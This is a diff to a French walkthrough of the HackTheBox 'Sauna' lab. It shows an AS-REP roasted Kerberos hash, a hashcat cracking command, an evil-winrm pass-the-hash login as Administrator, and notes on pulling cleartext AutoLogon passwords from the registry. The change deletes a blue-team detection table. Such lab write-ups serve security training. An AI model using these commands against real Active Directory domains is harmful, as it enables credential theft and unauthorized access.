@@ -158,7 +158,6 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 LDAP        <IP_CIBLE>   389    SAUNA            [*] Windows 10 / Server 2019 Build 17763 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:None) (channel binding:No TLS cert) 
 LDAP        <IP_CIBLE>   389    SAUNA            $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL@EGOTISTICAL-BANK.LOCAL:fc93e928b1ea46ffda32091445eac93f$a0b315c804ada2b81d7bf7178fb964ebe6ee22d7ec61c98637bb297b7217ff789fa0920b4a07d217c55643569ae2d890a7faf544e38d0d9b019ab7ba49040dc4a264d88d2e0a28b6c2bdf0a7eb09fff57144b8a645a37a57a86426f0b1167a736607258320729bd62cfadf9b3549786cd81ea6137b283ce2237d996ce369cd22aca128c574a5e9c3af699b75835b7ca3abd88ce3566e93eb70da808f01a893b60819c683d5bc92939afde92aef17d5c1b606b4df9d2eda9ba5587df69ffe82e47cb50c0df02cc320d4335cbe2fb15b9104f02df9c62427527df7b1adc7465643d4c0dedfe0dc30dc81f564aa2bf944c8abfc3e0b6fde86531c2609c3b670fc64  
 
-
 ┌──(kali㉿kali)-[~]
 └─$ hashcat -m 18200 out.asreproast /usr/share/wordlists/rockyou.txt
 hashcat (v7.1.2) starting
@@ -220,7 +219,6 @@ Hardware.Mon.#01.: Util: 55%
 
 Started: Wed Sep 30 09:08:35 2026
 Stopped: Wed Sep 30 09:08:47 2026
-
 
 ```
 
@@ -336,18 +334,7 @@ evil-winrm -i <IP_CIBLE> -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
 
 ---
 
-## 7. Côté Blue Team — détection
-
-| Étape | Trace / Event | Détection |
-| --- | --- | --- |
-| Username enum (kerbrute) | **4768/4771** en rafale (comptes testés) | pic d'échecs Kerberos |
-| AS-REP roast | 4768 sans pré-auth, RC4 | règle Sigma AS-REP |
-| Lecture registre autologon | accès `Winlogon` | EDR / audit registre |
-| DCSync | **4662** réplication depuis un non-DC | la détection reine AD |
-
----
-
-## 8. Leçons
+## 7. Leçons
 
 - **Énumération d'users par OSINT** : quand la session nulle est muette, le **site web** (noms d'employés) + `username-anarchy` + `kerbrute` reconstruisent la liste. Réaliste : les organigrammes/emails fuient les identifiants.
 - **AutoLogon** : réflexe à ajouter à ma checklist Windows — clé registre `Winlogon`, mot de passe en clair (`DefaultPassword`).
